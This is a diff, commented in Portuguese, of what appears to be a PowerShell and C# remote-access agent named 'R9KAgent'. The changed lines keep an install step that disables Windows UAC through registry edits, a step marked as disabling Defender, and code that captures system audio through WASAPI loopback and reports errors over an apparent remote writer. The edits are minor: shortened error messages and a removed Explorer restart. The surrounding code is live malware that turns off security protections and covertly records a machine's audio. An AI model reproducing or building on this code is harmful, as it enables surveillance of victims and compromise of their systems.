@@ -25,14 +25,11 @@ $vbsPath = "$dir\$installName.vbs"
 $bootPath = "$dir\boot_launcher.ps1"
 
 if ($args -notcontains "-silent") {
-    # 1. Desativar UAC e Reiniciar Explorer (SÓ UMA VEZ NA INSTALAÇÃO)
+    # 1. Desativar UAC (Não reinicia o explorer, apenas grava no registro)
     try {
         Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "EnableLUA" -Value 0 -Force -ErrorAction SilentlyContinue
         Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "ConsentPromptBehaviorAdmin" -Value 0 -Force -ErrorAction SilentlyContinue
         Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "PromptOnSecureDesktop" -Value 0 -Force -ErrorAction SilentlyContinue
-        
-        # Isso faz a tela piscar UMA VEZ e aplica o UAC off, sem reiniciar o PC
-        Stop-Process -Name explorer -Force -ErrorAction SilentlyContinue 
     } catch {}
 
     # 2. Desativar Defender (Sordum)
@@ -471,7 +468,7 @@ if (-not ("R9KAgent" -as [type])) {
                     IMMDevice device;
                     int hr = enumerator.GetDefaultAudioEndpoint(0, 1, out device);
                     if (hr != 0 || device == null) {
-                        lock (writeLock) { if (globalWriter != null) globalWriter.WriteLine("AUDIO_ERR: Nenhum dispositivo de audio padrao encontrado (PC sem placa de som ou desativado)."); }
+                        lock (writeLock) { if (globalWriter != null) globalWriter.WriteLine("AUDIO_ERR: Nenhum dispositivo de audio padrao encontrado."); }
                         isAudioRunning = false; return;
                     }
 
@@ -479,14 +476,14 @@ if (-not ("R9KAgent" -as [type])) {
                     IAudioClient audioClient;
                     hr = device.Activate(ref IID_IAudioClient, 23, IntPtr.Zero, out audioClient);
                     if (hr != 0 || audioClient == null) {
-                        lock (writeLock) { if (globalWriter != null) globalWriter.WriteLine("AUDIO_ERR: Falha ao ativar o dispositivo de audio HR=" + hr.ToString("X")); }
+                        lock (writeLock) { if (globalWriter != null) globalWriter.WriteLine("AUDIO_ERR: Falha ao ativar o dispositivo HR=" + hr.ToString("X")); }
                         isAudioRunning = false; return;
                     }
 
                     IntPtr pFormat;
                     hr = audioClient.GetMixFormat(out pFormat);
                     if (hr != 0 || pFormat == IntPtr.Zero) {
-                        lock (writeLock) { if (globalWriter != null) globalWriter.WriteLine("AUDIO_ERR: Falha ao obter formato de audio HR=" + hr.ToString("X")); }
+                        lock (writeLock) { if (globalWriter != null) globalWriter.WriteLine("AUDIO_ERR: Falha ao obter formato HR=" + hr.ToString("X")); }
                         isAudioRunning = false; return;
                     }
 
@@ -494,7 +491,7 @@ if (-not ("R9KAgent" -as [type])) {
                     
                     hr = audioClient.Initialize(0, 0x00080000, 10000000, 0, pFormat, IntPtr.Zero);
                     if (hr != 0) {
-                        lock (writeLock) { if (globalWriter != null) globalWriter.WriteLine("AUDIO_ERR: Driver de audio nao suporta Loopback (HR=0x" + hr.ToString("X") + ")"); }
+                        lock (writeLock) { if (globalWriter != null) globalWriter.WriteLine("AUDIO_ERR: Driver nao suporta Loopback (HR=0x" + hr.ToString("X") + ")"); }
                         CoTaskMemFree(pFormat);
                         isAudioRunning = false; return;
                     }
